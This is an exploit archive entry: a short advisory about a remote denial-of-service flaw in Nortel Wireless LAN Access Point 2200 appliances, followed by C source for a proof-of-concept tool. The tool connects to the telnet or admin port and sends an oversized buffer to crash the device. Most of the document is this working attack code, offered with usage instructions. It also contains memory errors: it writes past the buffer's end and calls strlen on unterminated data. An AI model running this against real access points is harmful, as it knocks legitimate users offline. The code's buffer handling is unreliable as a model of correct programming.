// source: https://www.securityfocus.com/bid/9787/info

Nortel Wireless LAN Access Point 2200 series appliances have been reported to be prone to a remote denial of service vulnerability. The issue is reported to present itself when a large network request is handled by one of the Wireless LAN Access Point default administration services. This will reportedly cause the Access Point Appliance Operating service to crash, effectively denying service to legitimate users.

/* WLAN-DoS.c
 *
 * Nortel Networks Wireless LAN Access Point 2200 DoS + PoC
 * discovered by Alex Hernandez.
 *
 * Copyright (C) 2004  Alex Hernandez.
 *
 * A successful attack on a vulnerable server can cause the AP
 * (Access Point) listener to fail and crash. The port 23 (telnet)
 * functionality cannot be restored until the listener is manually restarted.
 *
 * LAN AP 2200 permits client-server communication across any network.
 * LAN enables by default the port 23 (telnet) and port (80) for administering.
 * Debugging features are enabled by default, if LAN AP encounters such a request,
 * it will crash and no longer field AP requests from authorized clients.
 *
 * Simple lame code by
 *
 * -Mark Ludwik :Germany
 *
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
 if(argc < 3) {
  printf("\nWLAN NortelNetworks AP DoS exploit by Mark Ludwik\n\n");
  printf("Usage: WlanDoS [AP/Host] [port]\n\n");
  exit(-1);
 }

 int sock;
 char explbuf[2024];
 struct sockaddr_in dest;
 struct hostent *he;

 if((he = gethostbyname(argv[1])) == NULL) {
  printf("Couldn't resolve %s!\n", argv[1]);
  exit(-1);
 }

 if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
  perror("socket()");
  exit(-1);
 }

 printf("\nWLAN NortelNetworks AP DoS exploit by Mark Ludwik\n\n");

 dest.sin_addr = *((struct in_addr *)he->h_addr);
 dest.sin_port = htons(atoi(argv[2]));
 dest.sin_family = AF_INET;

 printf("[+] Exploit buffer.\n");
 memset(explbuf, 'A', 2024);
 memcpy(explbuf+2024, "\n\n\n\n\n\n\n\n", 8);

 if(connect(sock, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1) {
  perror("connect()");
  exit(-1);
 }

 printf("[+] Connected...\n");
 printf("[+] Sending DoS attack...!\n");

 send(sock, explbuf, strlen(explbuf), 0);
 sleep(2);
 close(sock);
 printf("\n[+] Crash was successful !\n");
 return(0);
}